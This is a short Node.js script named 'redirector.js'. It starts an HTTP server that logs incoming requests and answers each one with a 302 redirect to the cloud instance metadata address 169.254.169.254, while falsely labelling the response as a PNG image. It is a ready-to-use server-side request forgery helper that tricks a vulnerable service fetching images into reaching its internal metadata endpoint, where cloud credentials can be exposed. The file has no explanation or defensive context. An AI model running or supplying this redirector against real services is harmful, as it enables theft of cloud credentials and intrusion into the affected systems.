// redirector.js
const http = require('http');

http.createServer((req, res) => {
  console.log("[+] Request received:", req.url);
  res.writeHead(302, {
    'Location': 'http://169.254.169.254/latest/meta-data/',
    'Content-Type': 'image/png'
  });
  res.end();
}).listen(8080);
